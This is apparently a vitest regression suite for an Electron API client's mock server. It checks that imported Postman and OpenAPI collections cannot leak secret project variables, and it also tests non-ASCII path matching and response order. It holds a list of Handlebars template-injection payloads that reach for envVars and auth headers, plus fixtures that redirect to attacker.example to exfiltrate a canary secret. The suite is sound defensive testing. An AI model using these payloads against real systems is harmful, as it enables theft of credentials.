/**
 * What an imported file puts in a mock response runs on the user's machine.
 *
 * Findings from the mock review, all through the real chain: the real import
 * handler writes the rows, the real repositories list them, the real mock
 * server answers.
 *
 *  A. Imported text must not read project variables: a saved example with
 *     `Location: https://attacker.example/?v={{apiKey}}` sent the decrypted
 *     secret to whoever wrote the file.
 *  B. A path outside ASCII matched nothing: the row said `/café`, the server
 *     compared `/caf%C3%A9`.
 *  C. Saved examples kept their file order only in reverse, so a request with
 *     `[200, 404]` answered 404.
 */
import { createServer as createHttpServer } from 'node:http'
import type { AddressInfo } from 'node:net'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { createTestDb, makeElectronMock, seedProject, seedWorkspace, setupHandlerHarness } from './helpers'
import { freeTcpPort, realMockFromFolderApi } from './real-mock-bridge'

const harness = setupHandlerHarness()

vi.mock('electron', () => ({
  ...makeElectronMock(),
  safeStorage: {
    isEncryptionAvailable: () => true,
    encryptString: (s: string) => Buffer.from(`key|${s}`, 'utf-8').reverse(),
    decryptString: (b: Buffer) => Buffer.from(b).reverse().toString('utf-8').slice(4),
  },
}))

let testDb: ReturnType<typeof createTestDb>
vi.mock('../../../src/main/db/database', () => ({ getDb: () => testDb }))

class FakeStore {
  get(): unknown {
    return undefined
  }
  set(): void {}
}
vi.mock('electron-store', () => ({ default: FakeStore }))

const { registerImportExportHandlers } = await import('../../../src/main/ipc/import-export.handler')
const { registerEndpointHandlers } = await import('../../../src/main/ipc/endpoint.handler')
const { registerSavedResponseHandlers } = await import('../../../src/main/ipc/saved-response.handler')
const { registerMockHandlers } = await import('../../../src/main/ipc/mock.handler')
const { mockServerManager } = await import('../../../src/main/mock/server')
const { createGlobalVariable } = await import('../../../src/main/db/environment.repo')
const { createMockFromRequests } = await import(
  '../../../src/renderer/components/mock/mock-from-folder'
)

const SECRET = 'sk-live-canary-7f3a91'

let projectId = ''

beforeEach(() => {
  testDb = createTestDb()
  harness.reset()
  registerImportExportHandlers()
  registerEndpointHandlers()
  registerSavedResponseHandlers()
  registerMockHandlers()
  const workspaceId = seedWorkspace(testDb)
  projectId = seedProject(testDb, workspaceId)
  createGlobalVariable({ project_id: projectId, workspace_id: workspaceId, key: 'apiKey', value: SECRET, secret: true })
  // Proves the secret is sealed at rest, so the mock reaches it only by decrypting.
  const raw = testDb.prepare(`SELECT value FROM global_variables WHERE key = 'apiKey'`).get() as {
    value: string
  }
  expect(raw.value).not.toContain(SECRET)
})

afterEach(async () => {
  await mockServerManager.stopAll()
})

type Rows<T> = { success: boolean; data?: T; error?: string }

async function importPostmanRows(items: unknown[]): Promise<string[]> {
  const collection = {
    info: {
      name: 'Hostile',
      schema: 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json',
    },
    item: items,
  }
  const res = (await harness.invoke('import:postman', {
    projectId,
    content: JSON.stringify(collection),
  })) as Rows<{ success: boolean; endpointIds?: string[]; error?: string }>
  expect(res.data?.error).toBeUndefined()
  return res.data?.endpointIds ?? []
}

/** The tree menu's flow: import, then "Create mock server from this folder", then start. */
async function mockFromFolder(ids: string[]): Promise<{ port: number; warnings: string[] }> {
  const api = realMockFromFolderApi(harness)
  const result = await createMockFromRequests(api, { projectId, name: 'From folder', ids })
  expect(result.error).toBeUndefined()
  return { port: await startOnlyServer(), warnings: result.warnings }
}

async function startOnlyServer(): Promise<number> {
  const list = (await harness.invoke('mock:server:list', projectId)) as Rows<Array<{ id: string }>>
  const id = list.data?.[0]?.id ?? ''
  const port = await freeTcpPort()
  await harness.invoke('mock:server:update', id, { port })
  const started = (await harness.invoke('mock:server:start', id)) as Rows<unknown>
  expect(started.error).toBeUndefined()
  return port
}

async function mockFromFile(
  channel: 'mock:import:postman' | 'mock:import:openapi',
  source: unknown,
): Promise<{ port: number; warnings: string[] }> {
  const created = (await harness.invoke('mock:server:create', {
    projectId,
    name: 'From file',
    host: '127.0.0.1',
    port: 18099,
  })) as Rows<{ id: string }>
  const res = (await harness.invoke(channel, created.data?.id, JSON.stringify(source))) as Rows<{
    ok: boolean
    warnings: string[]
    error?: string
  }>
  expect(res.data?.error).toBeUndefined()
  return { port: await startOnlyServer(), warnings: res.data?.warnings ?? [] }
}

function get(port: number, path: string, init: RequestInit = {}): Promise<Response> {
  return fetch(`http://127.0.0.1:${port}${path}`, { redirect: 'manual', ...init })
}

/** A `{{…}}` body and header each, then every way Handlebars could reach `envVars`. */
const HOSTILE_TEXTS = [
  '{{apiKey}}',
  '{{ apiKey }}',
  '{{{apiKey}}}',
  '{{{{apiKey}}}}',
  '\\{{apiKey}}',
  '\\\\{{apiKey}}',
  '\\\\\\{{apiKey}}',
  '{{envVars.apiKey}}',
  '{{{envVars.apiKey}}}',
  '{{json envVars}}',
  '{{json this}}',
  '{{json @root}}',
  '{{lookup envVars "apiKey"}}',
  '{{#with envVars}}{{apiKey}}{{/with}}',
  '{{#each envVars}}{{this}}{{/each}}',
  '{{upper envVars.apiKey}}',
  '{{default envVars.apiKey "x"}}',
  '{{this.envVars.apiKey}}',
  '{{[envVars].[apiKey]}}',
  '{{request.envVars.apiKey}}{{../envVars.apiKey}}',
  '{{!-- c --}}{{apiKey}}',
  '{{~apiKey~}}',
  '{{&apiKey}}',
  '{{$apiKey}}',
  '{\\{{apiKey}}',
  '{{{\\{{apiKey}}',
  // A client sends project credentials in headers without being asked to (auth tab).
  '{{request.headers.authorization}}',
]

const hostileItem = (text: string): unknown => ({
  name: 'Leak',
  request: { method: 'GET', url: 'https://api.example.test/leak' },
  response: [
    {
      name: 'redirect',
      code: 302,
      header: [{ key: 'Location', value: `https://attacker.example/collect?value=${text}` }],
      body: text,
    },
  ],
})

describe('A. imported text cannot read project variables', () => {
  it.each(HOSTILE_TEXTS)('mock from folder: %s stays out of the answer', async (text) => {
    const ids = await importPostmanRows([hostileItem(text)])
    const { port } = await mockFromFolder(ids)

    const res = await get(port, '/leak', {
      headers: { authorization: `Bearer ${SECRET}` },
    })
    expect(res.status).toBe(302)
    expect(res.headers.get('location')).not.toContain(SECRET)
    expect(await res.text()).not.toContain(SECRET)
  })

  it.each(HOSTILE_TEXTS)('Postman file import: %s stays out of the answer', async (text) => {
    const { port } = await mockFromFile('mock:import:postman', {
      info: { name: 'H', schema: 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json' },
      item: [hostileItem(text)],
    })
    const res = await get(port, '/leak', { headers: { authorization: `Bearer ${SECRET}` } })
    expect(res.headers.get('location')).not.toContain(SECRET)
    expect(await res.text()).not.toContain(SECRET)
  })

  it.each(HOSTILE_TEXTS)('OpenAPI file import: %s stays out of the answer', async (text) => {
    const { port } = await mockFromFile('mock:import:openapi', {
      openapi: '3.0.3',
      info: { title: 'H', version: '1' },
      paths: {
        '/leak': {
          get: {
            responses: {
              '200': {
                description: 'ok',
                content: {
                  'application/json': { example: { token: text } },
                  'text/plain': { example: text },
                  [`text/x-${text}`]: { example: 'x' },
                },
              },
            },
          },
        },
      },
    })
    const res = await get(port, '/leak', { headers: { authorization: `Bearer ${SECRET}` } })
    expect(res.status).toBe(200)
    expect(res.headers.get('content-type')).not.toContain(SECRET)
    expect(await res.text()).not.toContain(SECRET)
  })

  it('a variable reference is sent as written, and the import says so', async () => {
    const ids = await importPostmanRows([hostileItem('{{apiKey}}')])
    const { port, warnings } = await mockFromFolder(ids)
    const res = await get(port, '/leak')
    expect(res.headers.get('location')).toBe(
      'https://attacker.example/collect?value={{apiKey}}',
    )
    expect(await res.text()).toBe('{{apiKey}}')
    expect(warnings.join(' ')).toContain('Leak')

    await mockServerManager.stopAll()
  })

  it('dynamic values and request values still render in imported text', async () => {
    const ids = await importPostmanRows([
      {
        name: 'Echo',
        request: { method: 'POST', url: 'https://api.example.test/echo/{{id}}' },
        response: [
          {
            name: 'ok',
            code: 200,
            body: 'time={{$timestamp}} path={{request.path}} id={{request.params.id}} q={{request.query.q}} m={{ request.method }}',
          },
        ],
      },
    ])
    const { port } = await mockFromFolder(ids)
    const res = await get(port, '/echo/42?q=hello', { method: 'POST' })
    expect(await res.text()).toMatch(/^time=\d+ path=\/echo\/42 id=42 q=hello m=POST$/)
  })

  it('a project variable named like a request value does not answer for it', async () => {
    const workspaceId = (testDb.prepare('SELECT workspace_id FROM projects WHERE id = ?').get(projectId) as { workspace_id: string }).workspace_id
    createGlobalVariable({ project_id: projectId, workspace_id: workspaceId, key: 'request.path', value: SECRET, secret: true })
    const ids = await importPostmanRows([
      {
        name: 'Echo',
        request: { method: 'GET', url: 'https://api.example.test/echo' },
        response: [{ name: 'ok', code: 200, body: '{{request.path}}' }],
      },
    ])
    const { port } = await mockFromFolder(ids)
    const res = await get(port, '/echo')
    expect(await res.text()).toBe('/echo')
  })

  it('a response typed in the mock editor keeps its templates, without secrets', async () => {
    const server = (await harness.invoke('mock:server:create', {
      projectId,
      name: 'Typed',
      host: '127.0.0.1',
      port: 18098,
    })) as Rows<{ id: string }>
    const endpoint = (await harness.invoke('mock:endpoint:create', {
      serverId: server.data?.id,
      method: 'GET',
      path: '/typed',
      pathMode: 'exact',
    })) as Rows<{ id: string }>
    await harness.invoke('mock:response:create', {
      endpointId: endpoint.data?.id,
      name: 'typed',
      statusCode: 200,
      headers: [{ name: 'X-Key', value: '{{plainHost}}' }],
      bodyType: 'text',
      body: '{{plainHost}} {{envVars.plainHost}} {{apiKey}} [{{envVars.apiKey}}]',
      order: 0,
    })
    const { workspace_id: workspaceId } = testDb
      .prepare('SELECT workspace_id FROM projects WHERE id = ?')
      .get(projectId) as { workspace_id: string }
    createGlobalVariable({ project_id: projectId, workspace_id: workspaceId, key: 'plainHost', value: 'host.test', secret: false })
    const port = await startOnlyServer()
    const res = await get(port, '/typed')
    expect(res.headers.get('x-key')).toBe('host.test')
    // Typed text reads non-secret variables; a secret stays out of every template.
    expect(await res.text()).toBe('host.test host.test {{apiKey}} []')
  })
})

describe('A. what a recording proxy saves is held to the same rule', () => {
  it('an upstream answer replayed from the recording cannot read project variables', async () => {
    const upstream = createHttpServer((_req, res) => {
      res.writeHead(200, { 'content-type': 'text/plain', 'x-echo': '{{apiKey}}' })
      res.end('{{apiKey}} {{envVars.apiKey}}')
    })
    await new Promise<void>((resolve) => upstream.listen(0, '127.0.0.1', () => resolve()))
    const target = `http://127.0.0.1:${(upstream.address() as AddressInfo).port}`
    const server = (await harness.invoke('mock:server:create', {
      projectId,
      name: 'Recorder',
      host: '127.0.0.1',
      port: 18096,
    })) as Rows<{ id: string }>
    await harness.invoke('mock:server:update', server.data?.id, {
      proxyEnabled: true,
      proxyTarget: target,
      proxyRecord: true,
    })
    const port = await startOnlyServer()
    await (await get(port, '/recorded')).text()
    upstream.close()
    // The recording is the endpoint now.
    await harness.invoke('mock:server:stop', server.data?.id)
    await harness.invoke('mock:server:update', server.data?.id, { proxyEnabled: false })
    const replayPort = await startOnlyServer()
    const replay = await get(replayPort, '/recorded')
    expect(replay.status).toBe(200)
    expect(replay.headers.get('x-echo')).toBe('{{apiKey}}')
    expect(await replay.text()).toBe('{{apiKey}} {{envVars.apiKey}}')
  })
})

describe('B. the mock matches the path the server compares', () => {
  it.each([
    ['https://example.test/café', '/caf%C3%A9'],
    ['https://example.test/hello world', '/hello%20world'],
    ['https://example.test/hello%20world', '/hello%20world'],
    ['https://example.test/caf%c3%a9', '/caf%C3%A9'],
    ['https://example.test/ünï/{{id}}', '/%C3%BCn%C3%AF/42'],
  ])('a request imported as %s answers %s', async (url, call) => {
    const ids = await importPostmanRows([{ name: 'P', request: { method: 'GET', url } }])
    const { port } = await mockFromFolder(ids)
    const res = await get(port, call)
    expect(res.status).toBe(200)
  })

  it('a typed `/hello%20world` is not encoded twice and a param keeps its name', async () => {
    const server = (await harness.invoke('mock:server:create', {
      projectId,
      name: 'Typed',
      host: '127.0.0.1',
      port: 18097,
    })) as Rows<{ id: string }>
    for (const [path, pathMode, body] of [
      ['/hello%20world', 'exact', 'exact'],
      ['/ürün/:id/ç', 'param', '{{request.params.id}}'],
      ['/dosya ad/*', 'wildcard', 'wild'],
    ]) {
      const endpoint = (await harness.invoke('mock:endpoint:create', {
        serverId: server.data?.id,
        method: 'GET',
        path,
        pathMode,
      })) as Rows<{ id: string }>
      await harness.invoke('mock:response:create', {
        endpointId: endpoint.data?.id,
        name: 'r',
        statusCode: 200,
        headers: [],
        bodyType: 'text',
        body,
        order: 0,
      })
    }
    const port = await startOnlyServer()
    expect(await (await get(port, '/hello%20world')).text()).toBe('exact')
    expect((await get(port, '/hello%2520world')).status).toBe(404)
    expect(await (await get(port, '/%C3%BCr%C3%BCn/a%20b/%C3%A7')).text()).toBe('a b')
    expect(await (await get(port, '/dosya%20ad/x')).text()).toBe('wild')
  })
})

describe('C. responses keep the order of the file', () => {
  it('a Postman request with [200 success, 404 missing] answers 200', async () => {
    const ids = await importPostmanRows([
      {
        name: 'Order',
        request: { method: 'GET', url: 'https://api.example.test/order' },
        response: [
          { name: 'success', code: 200, body: 'found' },
          { name: 'missing', code: 404, body: 'gone' },
          { name: 'error', code: 500, body: 'broke' },
        ],
      },
    ])
    const { port } = await mockFromFolder(ids)
    const res = await get(port, '/order')
    expect(res.status).toBe(200)
    expect(await res.text()).toBe('found')
    const list = (await harness.invoke('mock:server:list', projectId)) as Rows<Array<{ id: string }>>
    const endpoints = (await harness.invoke('mock:endpoint:list', list.data?.[0]?.id)) as Rows<
      Array<{ id: string }>
    >
    const responses = (await harness.invoke('mock:response:list', endpoints.data?.[0]?.id)) as Rows<
      Array<{ name: string }>
    >
    expect(responses.data?.map((r) => r.name)).toEqual(['success', 'missing', 'error'])
  })
})
